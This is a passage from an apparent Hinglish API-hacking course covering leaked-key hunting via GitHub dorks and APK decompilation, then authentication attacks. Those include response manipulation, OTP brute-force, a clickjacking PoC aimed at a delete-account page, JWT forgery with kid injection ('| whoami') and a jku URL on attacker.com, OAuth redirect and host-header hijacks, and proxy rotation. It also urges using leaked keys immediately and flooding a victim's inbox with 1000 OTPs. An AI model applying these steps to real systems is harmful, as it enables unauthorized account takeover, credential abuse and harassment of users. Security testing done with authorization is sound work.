#### 🔍 Visual - Screen Par Kya Dikhega
- **GitHub Search:** `"target.com" API key` search karo. Result mein kisi file mein `API_KEY=12345` dikhega.
- **Mobile Decompilation:** `jadx-gui` mein APK kholi, `strings.xml` mein `api_endpoint` dikha.

#### ⚙️ Under the Hood
- **GitHub Dorking:** GitHub ka search engine specific keywords dhundh sakta hai. Jaise `org:target "api_key"` se target organization ke andar search hota hai.
- **APK Decompilation:** APK ek compressed file hai. Jadx use kar ke usse Java source code mein convert kiya ja sakta hai. Strings.xml mein app ke saari strings hoti hain, jahan API keys store ho sakti hain.

#### 💻 Hands-On Step-by-Step
**Step 1: GitHub Dorks**
1. GitHub.com par jao.
2. Ye queries try karo:
   - `"target.com" api_key`
   - `"target.com" secret`
   - `"target.com" token`
   - `"target.com" password`
   - `filename:.env "target.com"` (environment files)
   - `extension:pem "target.com"` (private keys)
3. Results mein agar koi file mili jisme key hai, to copy karo.

**Step 2: GitLeaks Tool**
1. Gitleaks install karo: `brew install gitleaks` (Mac) ya binary download.
2. Command:  
   `gitleaks detect --source /path/to/repo --report output.json`
3. Ye tool automatically sensitive info scan karega.

**Step 3: Mobile App Decompilation**
1. APK download karo (apkpure, apkmirror se).
2. `jadx-gui` install karo, APK kholo.
3. Resources -> `strings.xml` open karo.
4. `Ctrl+F` karo `api`, `key`, `secret`.
5. Source code mein bhi dekho, kabhi kabhi endpoints hardcoded hote hain.

#### ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success:** Valid API key mil gayi, jisse API access mila.
- **Failure:** Koi key nahi mili, ya jo mili wo expired/invalid thi.

#### 🚫 Common Mistakes
- Sirf GitHub search karna, GitLab, Bitbucket ignore karna.
- Mobile app decompile karke strings.xml dekhna, source code na dekhna.
- Mili key ko immediately use karna bina validate kiye.

#### 🤔 Agar Dimag Ghoom Rahe Hai?
- **"API key mil gayi, lekin wo revoke ho sakti hai?"** – Haan, lekin jab tak revoke na ho, tab tak access hai. Turant use karo.
- **"GitHub par target ka official repo nahi mil raha?"** – Forked repos mein bhi original keys ho sakti hain.

#### 🌍 Real-World Use Case
Uber ki ek private GitHub repository mein ek employee ne AWS keys commit kar di. Kisi hacker ne dorking se wo keys dhundh li aur Uber ke AWS servers par access kar liya. Data breach hua.

#### 🛠️ Best Practices (Pro Tips)
- GitHub search ke saath **filters** use karo: `language:javascript` ya `path:config` taaki relevant files milein.
- Mobile apps ke alawa, **iOS IPA files** bhi decompile karo (similar process).
- **Shodan** par bhi API keys search karo – kabhi kabhi logs mein keys expose hoti hain.

#### ❓ FAQ
1. **Q: GitHub dorking legal hai?**  
   A: Public repos search karna legal hai. Lekin mili keys ka unauthorized use illegal ho sakta hai. Bug bounty mein report karo, use nahi.
2. **Q: APK decompile karne ke liye kaunsa tool best hai?**  
   A: Jadx (GUI) best hai, ya apktool + dex2jar.
3. **Q: Mili key ko test kaise karun?**  
   A: Us key ke saath API request bhejo. Agar 200 aaya toh valid hai.

#### 📝 Ek Line Mein Yaad Rakhne Ko
**Developer ki galti teri bounty hai – GitHub aur mobile apps mein secrets dhundho.**

---

## 🔥 Module 1 Summary: Recon & Discovery Checklist
1. **Passive:** Wappalyzer, BuiltWith se tech stack. JS files mein endpoints/keys.
2. **Active:** Kiterunner/ffuf se fuzzing, Arjun se hidden params, Swagger docs.
3. **Shadow APIs:** Version fuzzing, Host header change.
4. **Leaks:** GitHub dorks, APK decompilation.

Agla module chahiye toh batao – **Module 2: Authentication Bypass Techniques**? 🚀

========================================================================================

## 🔐 Module 2: Authentication & Session Management Deep-Dive
*Andar ka raasta (gateway) kitna strong hai?*

**Swagat hai Mentor ji!** Module 2 mein hum API ke **gateway** ko todna seekhenge – yani **Authentication**. Agar aap API ko ek private building maano, to authentication us building ka **security guard** hai. Agar hum guard ko bypass kar lete hain, ya uski uniform pehen lete hain, to andar ghusna aasaan ho jata hai. Is module mein hum response manipulation, JWT attacks, OAuth flaws, rate limiting bypass, aur bhi bahut kuch cover karenge. Chaliye shuru karte hain!

---

### Topic 2.1: 🎯 Title: Response Manipulation (Login Bypass)
*Server jhooth bole to frontend maan jaaye?*

#### 🐣 Samjhane ke liye (Analogy)
Socho tum school mein ho aur tumhe Principal se milna hai. Guard ne kaha "Principal sahab nahi milenge". Tumne Principal ka phone milaya, unhone kaha "Aajao beta". Ab tum guard ko jhooth bolte ho ki "Principal ne bulaya hai" aur guard maan jaata hai bina verify kiye. Yahan **guard = frontend (browser)**, **Principal ka phone = server response**.

#### 📖 Technical Definition
Response Manipulation tab hota hai jab frontend application server ke HTTP response par **blindly trust** karti hai, bina response body ko properly parse kiye. Agar frontend sirf **status code** (200 OK, 403 Forbidden) check karta hai na ki actual response body mein success flag, to attacker server se aaya 403 Forbidden ko intercept karke 200 OK mein badal kar frontend ko fool kar sakta hai.

#### 🧠 Zaroorat Kyun Hai?
Ye vulnerability **authentication bypass** ka ek simple lekin powerful tarika hai. Isse aap bina valid credentials ke kisi bhi user ke account mein login kar sakte ho, agar frontend silly hai.

#### 🔍 Visual - Screen Par Kya Dikhega
Burp Suite mein:
1. Request intercept karo login ki.
2. Server se response aata hai:  
   **Failed login:** `HTTP/1.1 403 Forbidden` with body `{"error":"Invalid credentials"}`  
   **Successful login:** `HTTP/1.1 200 OK` with body `{"token":"xyz","success":true}`
3. Tum response ko modify karoge: Failed login ka status code 200 OK kar doge, ya body mein success flag true kar doge.

#### ⚙️ Under the Hood
Frontend developers kabhi kabhi lazy programming karte hain. Jaise:
```javascript
fetch('/api/login', { /* credentials */ })
  .then(response => {
    if (response.status === 200) {
      // Login successful, redirect
      window.location = '/dashboard';
    } else {
      showError('Invalid credentials');
    }
  })
```
Is code mein sirf **status code** check ho raha hai. Response body nahi dekhi ja rahi. Isliye agar hum 403 ko 200 mein badal denge, to frontend samjhega ki login successful ho gaya.

#### 💻 Hands-On Step-by-Step (Reference: Page 1-4)
**Phase 1: Observation – Kya frontend sirf status code dekhta hai?**
1. Burp Suite open karo aur intercept ON karo.
2. Target website par correct credentials (e.g., `admin:admin`) daal kar login karo.
3. Burp mein request aayegi, usse forward karo.
4. Response aayega – maan lo `200 OK` with token.
5. Ab is response ko forward karne se pehle, status line change karo:
   - Original: `HTTP/1.1 200 OK`
   - Modified: `HTTP/1.1 403 Forbidden`
   - Response body mein token waisa hi rahne do.
6. Forward karo aur browser dekho.
7. **Observation:** Agar browser "Login Successful" dikhata hai (ya dashboard par le jata hai) 403 ke baad bhi, to frontend **sirf status code nahi** dekh raha, wo response body bhi dekh raha hai (success flag).  
   Agar browser "Unauthorized" error dikhata hai, to frontend **sirf status code** dekh raha hai.

**Phase 2: Exploit – Login Bypass**
1. Ab wrong credentials daalo (e.g., `admin:wrongpass`).
2. Burp mein response aayega `403 Forbidden` with body `{"error":"Invalid"}`.
3. Status line modify karo: `HTTP/1.1 200 OK`.
4. Agar body mein success flag hai (`"success":false`), to use bhi `"success":true` kar do.
5. Forward karo.
6. **Success:** Agar browser dashboard dikhata hai, to vulnerability confirmed! Tum bina correct password ke login kar gaye.

#### ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Successful Exploit:** Wrong credentials dene par bhi 200 OK modify karne se dashboard khul gaya.
- **Failure:** Wrong credentials par 200 OK modify karne se bhi error aaya – matlab frontend response body bhi check kar raha hai.

#### ⚖️ Comparison (X vs Y)
| Scenario | Response Status | Response Body | Frontend Behavior |
|----------|----------------|---------------|-------------------|
| Normal | 200 OK | `{"success":true}` | Login success |
| Vulnerable | 403 Forbidden (modified to 200) | `{"success":false}` (unchanged) | Login success (sirf status dekha) |
| Secure | 403 Forbidden (modified to 200) | `{"success":false}` | Login failed (body check kiya) |

#### 🚫 Common Mistakes
- Sirf status code badalna, body mein success flag nahi badalna, jabki frontend dono check kar raha ho.
- Response manipulation ke baad verify nahi karna ki actually login hua ya nahi.

#### 🤔 Agar Dimag Ghoom Rahe Hai?
- **"Response body mein success flag bhi badal diya, lekin login nahi hua?"** – Ho sakta hai frontend token bhi validate kar raha ho. Agar token invalid hai, to login nahi hoga. Isliye correct credentials ka token copy karke use karo.
- **"Ye vulnerability kitni common hai?"** – Purani websites mein common thi, abhi bhi kuch mobile apps mein mil jati hai.

#### 🌍 Real-World Use Case
Ek banking app mein, researchers ne dekha ki OTP verification sirf status code check kar raha tha. Unhone wrong OTP daala, response intercept kiya, 403 ko 200 mein badala, aur OTP bypass kar diya. **Critical vulnerability** thi.

#### 🎨 Visual Diagram (ASCII Art)
```
[User] -> [Frontend] -> [API] (wrong pass)
                         [API] -> 403 Forbidden
[Attacker intercepts] -> changes 403 to 200
[Frontend receives 200] -> "Login successful! Redirecting..."
[Attacker logged in]
```

#### 🛠️ Best Practices (Pro Tips)
- **Verification (Grep-Match Method):** (Reference: Page 4)  
  Agar correct aur wrong credentials ka response body same hai, to Intruder mein "Grep-Match" use karo:
  1. Burp Intruder mein request bhejo.
  2. Positions tab mein parameter ko variable mark karo (e.g., password).
  3. Payloads tab mein passwords list daalo.
  4. Options tab mein **Grep-Match** add karo: `"success":true` ya `"status":1` (jo bhi success flag ho).
  5. Attack start karo. Jo bhi response mein ye flag match karega, wo highlight hoga – matlab valid password mil gaya.
- Response manipulation ke baad, browser ke network tab mein dekho ki actual request response kya aaya.

#### ❓ FAQ
1. **Q: Response manipulation se session token bhi mil sakta hai?**  
   A: Haan, agar correct credentials ka token copy kar ke wrong credentials ke response mein daal do, to direct session mil jayega.
2. **Q: Frontend body check kar raha hai to kya karun?**  
   A: Body mein bhi manipulation karo – `"success":false` ko `"success":true` karo.
3. **Q: Ye vulnerability OWASP mein hai?**  
   A: OWASP API Top 10 mein specific nahi hai, lekin broken authentication ka part hai.

#### 📝 Ek Line Mein Yaad Rakhne Ko
**Agar frontend sirf status code dekhta hai, to 403 ko 200 bana ke andar ghus jao.**

---

### Topic 2.2: 🎯 Title: No-Rate Limit Attacks
*OTP se user ki inbox blast kar do*

#### 🐣 Samjhane ke liye (Analogy)
Tum kisi dukaan par gaye aur wahan ek button hai "Free Gift". Tumne use 100 baar dabaya. Dukaan wale ne rok kyun nahi? Agar wo rokta, to tum ek baar hi dabate. Yahan **Rate Limit** wo rokne ka mechanism hai. Agar nahi hai, to tum 1000 baar OTP bhej kar user ki inbox bhar sakte ho, ya OTP brute-force kar sakte ho.

#### 📖 Technical Definition
Rate limiting ek mechanism hai jo ek specific time frame mein ek user ya IP se hone wali requests ki frequency limit karta hai. Agar API par rate limiting nahi hai, to attacker **brute-force attacks** (OTP/password guessing) ya **DoS (Denial of Service)** kar sakta hai.

#### 🧠 Zaroorat Kyun Hai?
- **OTP Brute-Force:** Agar OTP sirf 4-digit hai aur koi limit nahi, to 9999 attempts mein se koi na koi sahi ho jayega.
- **Account Takeover:** Isse accounts hack ho sakte hain.
- **Inbox Bombing:** User ko hundreds of OTP messages bhej kar irritate kar sakte ho.

#### 🔍 Visual - Screen Par Kya Dikhega
Burp Intruder mein:
1. OTP verification request capture karo.
2. OTP field ko variable mark karo (e.g., `otp=§1234§`).
3. Payloads mein numbers daalo (0000 to 9999).
4. Attack start karo. Har request 200 OK aayega, koi limit nahi.

#### ⚙️ Under the Hood
Server usually:
- IP address ya user ID ke saath ek counter store karta hai.
- Har attempt par counter increment.
- Agar counter > threshold, to block karo.

Agar ye logic missing hai, to unlimited attempts possible.

#### 💻 Hands-On Step-by-Step (Reference: Page 18)
**Exploit 1: OTP Brute-Force**
1. Login ya password reset flow mein OTP daalne wala step dhundho.
2. Burp mein request capture karo, jaise:
   `POST /api/verify-otp`  
   `{"phone":"1234567890","otp":"1234"}`
3. Send to Intruder.
4. OTP parameter ko `§` mein mark karo.
5. Payloads tab mein **Numbers** select karo, from 0000 to 9999, step 1.
6. Attack start karo. Response length dekho – jiska response length algha ho, wo successful OTP ho sakta hai.
7. Ya **Grep-Match** use karo `"success":true`.

**Exploit 2: Inbox Bombing (DoS)**
1. OTP send request capture karo, jaise:
   `POST /api/send-otp`  
   `{"email":"victim@example.com"}`
2. Is request ko **Intruder** mein bhejo, ya simple Python script likho.
3. 1000 requests bhejo.
4. Victim ke inbox mein 1000 OTP messages aa jayenge.
5. **Impact:** User ka phone spam se bhar jayega, aur wo temporary block bhi ho sakta hai.

#### ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success:** 1000 requests sab 200 OK aaye, OTP brute-force successful.
- **Failure:** 5-6 requests ke baad 429 Too Many Requests aaya – rate limiting hai.

#### ⚖️ Comparison (X vs Y)
| Attack Type | Method | Impact |
|-------------|--------|--------|
| OTP Brute-Force | Har possible OTP try karna | Account takeover |
| Inbox Bombing | Har second OTP bhejna | User annoyance, SMS costs |
| Password Brute-Force | Common passwords try karna | Account takeover |

#### 🚫 Common Mistakes
- Sirf login attempts check karna, password reset OTP ko ignore karna.
- IP-based rate limiting ko bypass karne ke liye VPN/proxy use nahi karna.

#### 🤔 Agar Dimag Ghoom Rahe Hai?
- **"OTP 6-digit hai to 10 lakh attempts lagenge. Itna time kaise milega?"** – Isliye rate limit ka issue tab critical hota hai jab OTP 4-digit ho (9999 attempts), ya 6-digit ho lekin koi lockout na ho. Phir bhi automated tool se raat bhar chhod do, mil jayega.
- **"Server ne IP block kar diya to?"** – Rotating proxies use karo, ya different headers (`X-Forwarded-For`) se bypass try karo.

#### 🌍 Real-World Use Case
WhatsApp par ek flaw tha ki OTP verification unlimited attempts ki ja sakti thi. Attackers ne iska fayda utha kar accounts hack kiye. Baad mein rate limiting implement ki gayi.

#### 🛠️ Best Practices (Pro Tips)
- **Turbo Intruder** use karo for high-speed attacks.
- Python script mein **proxies** rotate karo:
  ```python
  proxies = {'http': 'http://proxy1.com', 'https': 'https://proxy1.com'}
  requests.post(url, json=data, proxies=proxies)
  ```
- Agar response time mein difference ho, to usse bhi brute-force mein help milti hai.

#### ❓ FAQ
1. **Q: Rate limiting bypass ke aur tarike?**  
   A: IP rotation, headers manipulation (`X-Forwarded-For`), ya multiple accounts use karna.
2. **Q: Kaunsa OTP vulnerable hota hai?**  
   A: Sirf numeric OTP (4-6 digit) brute-force ho sakta hai. Alphanumeric mushkil hai.
3. **Q: Bug bounty mein iska kya severity hai?**  
   A: OTP brute-force se account takeover possible hai to **Critical** ya **High**.

#### 📝 Ek Line Mein Yaad Rakhne Ko
**Jahan limit nahi, wahan brute-force se account tod do.**

---

### Topic 2.3: 🎯 Title: Clickjacking (Session Riding)
*User ko dhokha de kar button daba do*

#### 🐣 Samjhane ke liye (Analogy)
Tum market mein khade ho. Ek banda aaya aur bola "Ye button daba do, free ice cream milega". Tumne daba diya. Pata chala ki wo button tumhare bank ka "Transfer Money" button tha aur tumne apne saare paise transfer kar diye. Yahan **browser = tum**, **hacker ka page = wo banda**, **transparent iframe = chhupa button**.

#### 📖 Technical Definition
Clickjacking (UI redressing) mein attacker ek transparent iframe mein target website ko load karta hai, aur uske upar ek attractive button ya link rakhta hai. User jab attractive button par click karta hai, actually wo target website ke button par click kar deta hai, kyunki wo already logged-in hai. Isse **session riding** bhi kehte hain.

#### 🧠 Zaroorat Kyun Hai?
Isse attacker user ki permission ke bina sensitive actions kara sakta hai – jaise account delete karna, password change karna, money transfer karna.

#### 🔍 Visual - Screen Par Kya Dikhega
Burp Suite mein:
1. Kisi bhi response par right-click karo.
2. **"Check for Clickjacking"** option select karo.
3. Burp ek HTML page generate karega jo target ko iframe mein load karega.
4. Agar page iframe mein load ho jata hai, to vulnerable hai.

#### ⚙️ Under the Hood
Clickjacking se bachne ke liye websites **X-Frame-Options** header use karti hain:
- `X-Frame-Options: DENY` – koi bhi iframe mein load nahi ho sakta.
- `X-Frame-Options: SAMEORIGIN` – sirf same domain ke iframe mein load ho sakta hai.

Agar ye header missing hai, to koi bhi website iframe mein target load kar sakti hai.

#### 💻 Hands-On Step-by-Step (Reference: Page 18-19)
**Phase 1: Testing for Clickjacking**
1. Burp Suite mein kisi bhi sensitive page ki request dhundho (e.g., `GET /delete-account`).
2. Response select karo, right-click -> **"Check for Clickjacking"**.
3. Burp ek HTML file generate karega. Use browser mein open karo.
4. **Observation:** Agar target page iframe mein dikh raha hai, to vulnerable hai.

**Phase 2: Creating a Proof-of-Concept**
1. Ye HTML code likho:
```html
<html>
<head>
  <title>Clickjacking PoC</title>
  <style>
    iframe {
      width: 500px;
      height: 500px;
      position: absolute;
      top: 0;
      left: 0;
      opacity: 0.5; /* Initially transparent rakh sakte ho */
      z-index: 2;
    }
    button {
      position: absolute;
      top: 200px;
      left: 200px;
      z-index: 1;
      font-size: 50px;
    }
  </style>
</head>
<body>
  <button>Click for Free Ice Cream!</button>
  <iframe src="https://target.com/delete-account"></iframe>
</body>
</html>
```
2. Is file ko server par host karo ya locally open karo.
3. User ko ye page bhejo.
4. Jab user button click karega, actually wo iframe ke andar "Delete Account" button par click karega.

#### ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success:** Target page iframe mein load ho raha hai, aur user ko dhokha de kar action karaya ja sakta hai.
- **Failure:** Page iframe mein load nahi hota (blank aata hai) – `X-Frame-Options` present hai.

#### ⚖️ Comparison (X vs Y)
| Header | Behavior | Security |
|--------|----------|----------|
| No header | Kisi bhi site ke iframe mein load ho sakta hai | ❌ Vulnerable |
| `X-Frame-Options: DENY` | Kisi bhi iframe mein load nahi hoga | ✅ Secure |
| `X-Frame-Options: SAMEORIGIN` | Same domain ke iframe mein load hoga | ⚠️ Partial secure |

#### 🚫 Common Mistakes
- Sirf login page check karna, sensitive action pages (delete, transfer) miss karna.
- Ye assume karna ki agar page iframe mein load ho raha hai to exploit possible hai. Actually, user ko click dila pana bhi important hai.

#### 🤔 Agar Dimag Ghoom Rahe Hai?
- **"User ko click kaise dilayenge?"** – Attractive offers, games, ya urgent messages ka sahara lo. Social engineering se.
- **"Opacity 0 kar di to user dekhega nahi iframe, to click kaise karega?"** – Opacity 0 karne se iframe invisible ho jayega, lekin user attractive button par click karega jo uske upar hai. Lekin us attractive button ke click event ko iframe tak forward karna padega – isliye opacity 0.5 rakho taaki debug ho sake, final exploit mein opacity 0 kar do.

#### 🌍 Real-World Use Case
Facebook pe clickjacking attack hua tha jisme users ko "Like" button par click karaya gaya bina unki jaankari ke. Isse pages ki likes artificially badh gayi.

#### 🛠️ Best Practices (Pro Tips)
- **Double-check:** Agar `X-Frame-Options` missing hai, to bhi kuch modern browsers `frame-ancestors` CSP header use karte hain. Use bhi check karo:
  `Content-Security-Policy: frame-ancestors 'none';`
- Bug bounty mein report karte waqt, PoC mein iframe ko visible rakh sakte ho taaki triage team samajh sake.

#### ❓ FAQ
1. **Q: Clickjacking se session hijack ho sakta hai?**  
   A: Nahi, session hijack nahi hota, but user ke session ka fayda utha kar actions karaye ja sakte hain.
2. **Q: Iska OWASP Top 10 mein kya number hai?**  
   A: OWASP API Top 10 mein specifically nahi hai, but ye client-side attack hai.
3. **Q: Mobile apps mein clickjacking possible hai?**  
   A: Mobile apps mein WebViews mein ho sakta hai, agar settings sahi nahi hain.

#### 📝 Ek Line Mein Yaad Rakhne Ko
**Agar iframe mein load ho raha hai, to user ko dhokha de kar kuch bhi karwa lo.**

---

### Topic 2.4: 🎯 Title: JWT Attacks – The JSON Web Token Manipulation
*Apna khud ka token bana lo*

#### 🐣 Samjhane ke liye (Analogy)
Socho tumhe concert mein jaana hai. Ticket counter par tumhe ek paper ticket milta hai jisme likha hai "VIP Access". Tum ticket lekar andar ghus jaate ho. Ab agar tum ticket ke paper par "VIP" ko erase kar ke "Backstage" likh do, aur guard wahi ticket check kare bina signature verify kiye, to tum backstage mein ghus jaoge. Yahan **ticket = JWT**, **signature = server ka secret**.

#### 📖 Technical Definition
JWT (JSON Web Token) ek stateless authentication mechanism hai. Ye teen parts mein banta hai: `header.payload.signature`. Header aur payload base64 encoded hote hain, aur signature server ke secret se sign hota hai. Agar server signature properly verify nahi karta, to attacker payload modify kar ke apna role change kar sakta hai.

#### 🧠 Zaroorat Kyun Hai?
JWT attacks se aap **privilege escalation** kar sakte ho – normal user se admin ban sakte ho, ya kisi aur user ban sakte ho. Ye API hacking mein sabse common aur critical vulnerabilities hain.

#### 🔍 Visual - Screen Par Kya Dikhega
JWT kuch aisa dikhta hai:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.4x1jU8JkL9KxJkL9KxJkL9K
```
Dots se separated teen parts.

#### ⚙️ Under the Hood
JWT verification mein teen steps:
1. Header se algorithm pata karo (`alg`).
2. Signature verify karo using secret.
3. Payload mein se user info lo.

Agar koi step galat hai, to attack possible hai.

#### 💻 Hands-On Step-by-Step
**Attack 1: None Algorithm Attack**
1. Token capture karo.
2. Header mein `"alg":"HS256"` ko `"alg":"none"` karo.
3. Signature part hata do (empty rakho).
4. Payload modify karo (e.g., `"role":"admin"`).
5. New token banao: `eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.`
6. Request mein token replace karo.
7. **Success:** Agar server `alg:none` accept karta hai to admin access mil jayega.

**Attack 2: Algorithm Confusion (RS256 to HS256)**
1. Agar server RS256 use kar raha hai (asymmetric), to public key mil sakti hai (e.g., from `/jwks.json`).
2. Public key ko HS256 (symmetric) ke liye secret ki tarah use karo.
3. New token banao with HS256 and public key as secret.
4. Server verify karega to public key se hi hoga, aur accept kar lega.
5. Tool: `jwt_tool` use karo:
   `python jwt_tool.py <token> -X a -pk public.key`

**Attack 3: kid (Key ID) Injection**
1. Token header mein `"kid":"key1"` hota hai.
2. Agar server `kid` ko path ki tarah use karta hai, to try karo:
   - `"kid":"../../../../dev/null"` – ye null key use karega.
   - `"kid":"file:///etc/passwd"` – LFI try karo.
3. Command injection bhi try karo: `"kid":"| whoami"`

**Attack 4: jku (JWK Set URL) Injection**
1. Header mein `"jku":"https://server.com/jwks.json"` hota hai.
2. Apna khud ka JWKS server banao with your public key.
3. Header mein `"jku":"https://attacker.com/jwks.json"` set karo.
4. Apne private key se sign karo.
5. Server aapke JWKS se public key leke verify karega, aur accept kar lega.

#### ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success:** Token modify kar ke admin access mil gaya, ya kisi aur user ka data mila.
- **Failure:** Server "Invalid signature" error deta hai.

#### ⚖️ Comparison (X vs Y)
| Attack | Method | Difficulty |
|--------|--------|------------|
| None Algorithm | `alg:none` | Easy |
| Algorithm Confusion | RS256 to HS256 | Medium |
| kid Injection | Path traversal | Medium |
| jku Injection | External JWKS | Hard |

#### 🚫 Common Mistakes
- Sirf HS256 tokens par focus karna, RS256 ignore karna.
- `kid` injection mein path traversal ke alawa SQLi bhi ho sakti hai, ignore karna.

#### 🤔 Agar Dimag Ghoom Rahe Hai?
- **"Public key kaise milegi?"** – Often `/jwks.json`, `/.well-known/jwks.json`, ya response headers mein.
- **"None algorithm kaise try karun?"** – Header base64 decode karo, modify karo, fir base64 encode karo aur signature part khali rakho.

#### 🌍 Real-World Use Case
Paytm ki API mein JWT vulnerability thi jisme `kid` parameter SQL injection vulnerable tha. Attacker `kid` mein SQLi daal kar secret nikal sakta tha.

#### 🛠️ Best Practices (Pro Tips)
- **jwt_tool** install karo: `git clone https://github.com/ticarpi/jwt_tool`
- **Burp Extension:** "JSON Web Tokens" extension use karo.
- Manual tampering ke liye `jwt.io` website use kar sakte ho.

#### ❓ FAQ
1. **Q: JWT secret kaise pata karein?**  
   A: Weak secret hai to crack karo `hashcat` se. Common wordlist use karo.
2. **Q: JWKS kya hai?**  
   A: JSON Web Key Set – server ke public keys ka set.
3. **Q: Kya JWT hamesha vulnerable hota hai?**  
   A: Nahi, proper implementation secure hai.

#### 📝 Ek Line Mein Yaad Rakhne Ko
**JWT ka header aur payload kholo, algorithm badlo, signature hatao, aur admin ban jao.**

---

### Topic 2.5: 🎯 Title: OAuth 2.0 Misconfigurations
*Dusre ke account se login karo*

#### 🐣 Samjhane ke liye (Analogy)
Tum kisi hotel mein gaye. Wahan bola "Google se login karo". Tum Google login karte ho, aur hotel ko apna Google ID ka pata chalta hai. Ab agar hotel wala Google se pooche "Iska email kya hai?" bina tumhari permission ke, to tumhari privacy leak ho jayegi. Yahan **Google = OAuth provider**, **hotel = client app**.

#### 📖 Technical Definition
OAuth 2.0 ek authorization framework hai jisme user kisi third-party app ko apne resources ka limited access de sakta hai bina apni credentials share kiye. Misconfigurations mein attacker authorization code hijack kar sakta hai, ya redirect_uri manipulate kar sakta hai.

#### 🧠 Zaroorat Kyun Hai?
OAuth flaws se aap kisi bhi user ke account mein login kar sakte ho bina unka password jaane, agar client app ne OAuth theek implement nahi kiya.

#### 🔍 Visual - Screen Par Kya Dikhega
OAuth flow:
1. User clicks "Login with Google"
2. Redirect to `accounts.google.com/o/oauth2/auth?client_id=123&redirect_uri=https://client.com/callback&response_type=code`
3. User grants permission
4. Google redirects to `client.com/callback?code=AUTH_CODE`
5. Client server exchanges code for token.

#### ⚙️ Under the Hood
Main components:
- **Client ID:** App ki public identity
- **Client Secret:** App ka private key (server-side)
- **Redirect URI:** Jahan code bhejna hai
- **Authorization Code:** Temporary code jo token ke liye exchange hota hai
- **Access Token:** Actual resource access ke liye

#### 💻 Hands-On Step-by-Step
**Attack 1: Redirect URI Manipulation**
1. OAuth login flow start karo.
2. Burp mein authorize request capture karo.
3. `redirect_uri` parameter ko modify karo apne domain par:
   `redirect_uri=https://attacker.com/callback`
4. Agar server allowed redirect URIs ko properly validate nahi karta, to authorization code attacker ke server par aa jayega.
5. Attacker ye code use kar ke token le sakta hai.

**Attack 2: CSRF on OAuth**
1. Jab user OAuth login karta hai, ek `state` parameter hota hai jo CSRF token ka kaam karta hai.
2. Agar `state` missing hai ya predictable hai, to attacker apna OAuth code kisi aur user ke account se link kar sakta hai.

**Attack 3: Code Leakage via Referer**
1. Jab Google redirect karta hai client callback par, URL mein `code` hota hai.
2. Agar client page mein koi external resource (image, script) load ho raha hai, to `Referer` header mein `code` leak ho sakta hai.

#### ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success:** Authorization code apne server par mil gaya, use token exchange kiya, aur user ka account access kar liya.
- **Failure:** Server invalid redirect_uri error dega, ya code validate nahi hoga.

#### ⚖️ Comparison (X vs Y)
| Attack | Target | Impact |
|--------|--------|--------|
| Redirect URI Manipulation | Authorization code hijack | Account takeover |
| CSRF | State parameter missing | Account linking |
| Code Leakage | Referer header | Token theft |

#### 🚫 Common Mistakes
- Sirf client_id check karna, redirect_uri ko ignore karna.
- `state` parameter implement na karna.
- Code ko URL mein expose karna (should be POST).

#### 🤔 Agar Dimag Ghoom Rahe Hai?
- **"Redirect URI validate kaise hota hai?"** – Client registration ke time allowed URIs list di jati hai. Server check karta hai ki redirect_uri us list mein hai ya nahi. Agar partial match check ho raha hai, to `https://client.com/callback.attacker.com` bhi accept ho sakta hai.

#### 🌍 Real-World Use Case
Facebook OAuth mein ek flaw tha ki `redirect_uri` properly validate nahi hota tha. Attacker code hijack kar ke kisi bhi user ka account le sakta tha.

#### 🛠️ Best Practices (Pro Tips)
- OAuth testing ke liye **OAuth 2.0 Pentesting Guide** padho.
- Burp Extension: **OAuth Scan** use karo.
- Manual testing mein har redirect_uri variation try karo.

#### ❓ FAQ
1. **Q: OAuth aur JWT mein kya difference?**  
   A: OAuth authorization framework hai, JWT token format hai. OAuth JWT use kar sakta hai.
2. **Q: Authorization code kaise hijack karun?**  
   A: Redirect URI apne server par point karo, aur code capture karo.
3. **Q: CSRF se kaise bachein?**  
   A: `state` parameter use karo jo unpredictable ho.

#### 📝 Line Mein Yaad Rakhne Ko
**OAuth ka redirect_URI kholo, code apne paas bhej lo, aur account le lo.**

---

### Topic 2.6: 🎯 Title: Password Reset Logic Flaws
*Password reset tod do*

#### 🐣 Samjhane ke liye (Analogy)
Maano tum apna password bhool gaye. Website par "Forgot Password" click karte ho. Wo tumhe email bhejti hai link. Ab agar wo link ka format simple ho, jaise `reset?token=123`, to tum 123,124,125 try kar sakte ho aur kisi aur ka reset kar sakte ho.

#### 📖 Technical Definition
Password reset functionality mein flaws hote hain jaise predictable tokens, token reuse, ya parameter manipulation se kisi aur ka password change kar dena.

#### 🧠 Zaroorat Kyun Hai?
Isse aap kisi bhi user ka password change kar sakte ho, account takeover kar sakte ho.

#### 🔍 Visual - Screen Par Kya Dikhega
Reset link kuch aisa:  
`https://target.com/reset?token=abc123&user=john`

#### 💻 Hands-On Step-by-Step
**Attack 1: Predictable Tokens**
1. Apne email par reset request karo.
2. Token note karo: `token=123456`
3. Dusra reset request karo, token aaya `123457`.
4. Incrementing hai to brute-force possible hai.
5. Victim ka email daalo aur tokens brute-force karo.

**Attack 2: Host Header Injection**
1. Reset request intercept karo.
2. `Host` header change karo `attacker.com`.
3. Server reset link bana sakta hai `http://attacker.com/reset?token=xyz`
4. User link click karega to token attacker ke server par aa jayega.

**Attack 3: Parameter Pollution**
1. Reset request: `POST /reset` with `{"email":"victim@mail.com"}`
2. Try `{"email":"victim@mail.com","email":"attacker@mail.com"}`
3. Kya server victim ko link bhejta hai ya attacker ko?

#### ✅ Kaamyabi ki Nishani
- **Success:** Victim ka password change kar diya.
- **Failure:** Apna hi password change ho raha hai.

#### 📝 Ek Line Mein Yaad Rakhne Ko
**Reset token weak hai to kisi ka bhi account le lo.**

---

### Topic 2.7: 🎯 Title: Multi-Factor Authentication (MFA) Bypass
*Do tala tod do*

#### 🐣 Samjhane ke liye (Analogy)
Ghar par do tala lagaye hain. Ek guard ke paas, ek gate par. Agar tum guard ko bypass kar ke gate tak pahunch gaye, to ek tala todna hai. Waise hi, MFA ke baad bhi agar session handling weak hai to bypass possible hai.

#### 📖 Technical Definition
MFA bypass tab hota hai jab:
- MFA sirf specific steps par apply ho (e.g., login par, but API calls par nahi)
- MFA code predictable ho
